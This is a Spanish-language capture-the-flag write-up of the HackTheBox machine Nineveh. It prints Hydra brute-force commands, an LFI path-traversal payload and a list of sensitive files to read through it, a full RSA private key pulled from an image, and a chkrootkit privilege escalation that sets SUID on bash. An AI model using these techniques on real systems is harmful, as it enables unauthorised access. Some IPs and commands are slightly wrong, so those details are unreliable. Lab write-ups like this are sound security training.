------
- Tags: #hydra #lfi #steganography #php-lite-admin #knock #port-knocking #chkrootkit 
- ------------------
## Técnicas utilizadas
- Abusing http forms with Hydra - Login Brute Force  
- Local File Inclusion (LFI)  
- Steganography - id_rsa hidden in image  
- Abusing phpLiteAdmin v1.9 (Remote Code Execution)  
- Abusing Knockd - Port Knocking  
- Chkrootkit 0.49 - Local Privilege Escalation  
- Using Wrappers - LFI [EXTRA]
## Procedimiento

![[Pasted image 20230721151323.png]]

-------
#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p80,443 10.10.10.43 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 23:20 MST
Nmap scan report for 10.10.10.43
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.82 seconds
```

Un escaneo con **WhatWeb** sobre el aplicativo web nos muestra las siguientes tecnologías corriendo por detras:
```ruby
# whatweb 10.10.10.43 && whatweb 10.10.10.43:443
http://10.10.10.43 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
http://10.10.10.43:443 [400 Bad Request] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43], Title[400 Bad Request]
```

----------
#### Abusing http forms with Hydra - Login Brute Force  
Visitando la pagina web, nos percatamos de que no hay nada interesante. Fuzzeando por directorios con **Wfuzz** llegamos a dar con una ruta de nombre **Department**:
![[Pasted image 20230721232315.png]]

Al ingresar a la ruta, nos encontramos con un **Login** el cual parece ser vulnerable a **User Enumeration** a través de mensajes de error. Encontramos que el usuario **Admin** existe dentro del aplicativo web, asi que como no tenemos ninguna otra via, intentaremos un ataque de fuerza bruta sobre el **Login** con **Hydra**:
```
# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/departaments/login.php:username=admin&password=^PASS^:Invalid Password" -t 50
```

Y no encuentra la siguiente contraseña para el usuario **Admin**:
![[Pasted image 20230721232658.png]]

---------------
#### Local File Inclusion (LFI)  
La **URL** tiene un aspecto peculiar, parece utilizar el parametro **Notes** para incluir archivos de la maquina. Si intentamos un **Path Transveral** hacia alguno de las rutas tipicas contra las que se suele atentar en **LFI** podemos llegar a listar el  **/etc/passwd** utilizando algunas tecnicas de evasión, dado que toma como base el directorio **ninevehNotes**:
```
notes=/ninevehNotes/../../../../../../etc/passwd
```

**Rutas intetesantes a las cuales apuntar**:
```
/proc/net/fib_trie     #Podemos ver si estamos en un contenedor
/proc/net/tcp          #Podemos listar los puertos que estan abiertos internamente
/proc/self/environ     #Listamos las variables de entorno
/etc/os-release        #Listamos el sistema operativo en uso
/proc/schedstat        #proporciona estadísticas de planificación del kernel
/etc/knockd.conf       #Lista la configuración de Knock
```

----------
#### Steganography - id_rsa hidden in image 
Tenemos aún un servicio web sin enumerar, vamos a **Fuzzear** por directorios ahora en el servicio **HTTPS** para ver que encontramos:
![[Pasted image 20230722000109.png]]

Encontramos dos potenciales directorios, por un lado tenemos **db** y por otro **secure_notes**. El primero es un **Login** y el segundo basicamente es una imagen, la cual, problemente si aplicamos tecnicas de Steganografia podramos llegar a conseguir algo, dado que se encuentra un un directorio que insita a rebuscar. Si aplicamos un **strings** sobre la imagen llegamos a ver una **id_rsa**:
```
# string nineveh.png
[...]
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
[...]
```

Ahora, gracias a que hemos golpeado los puertos con **knock** que encontramos en el **knockd.conf** podemos conectarnos a través de **SSH**:
```
# ssh user@10.10.14.17 -i id_rsa
```

----------
#### Abusing phpLiteAdmin v1.9 (Remote Code Execution)  
Otra forma de ganar acceso a la maquina es a través de explotar una vulnerabilidad en el directorio **db** que encontramos en el apartado anterior, el cual contiene un **PhpLiteAdmin**. Con **Hydra**, volvemos a intentar un ataque de fuerza bruta sobre el **Login**:
```
# hydra -l none -P /usr/share/wordlist/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 50
```

Y obtenemos la siguiente credencial:
![[Pasted image 20230721235714.png]]

Listando por vulnerabilidades para la versión actualmente en uso de **PhpLiteAdmin** encontramos una de tipo **Remote Code Execution** la cual explica que necesitamos crear primero una base de datos con extensión **php**. Luego nos cuenta que podemos crear una tabla, a la cual le podemos insertar un campo con la estructura tipica de un **.php**, como por ejemplo, una **WebShell**.

------------
#### Chkrootkit 0.49 - Local Privilege Escalation  
Dentro de la maquina, podemos subir el **PsPy** para analizar los comandos que se estan ejecutando en intervalos regulares de tiempo:
![[Pasted image 20230722000015.png]]

Encontramos un **chkrootkit**, el cual si buscamos por vulnerabilidades con **SearchSploit** encontramos una de tipo **Privilage Escalation**:
![[Pasted image 20230721235955.png]]

Nos cuenta que en **/tmp** se ejecuta un archivo de nombre **update** cada intervalo de tiempo. Podemos crear un archivo con dicho nombre e indicarle que se le asigne un privilegio **SUID** a la **Bash**:
![[Pasted image 20230721235943.png]]


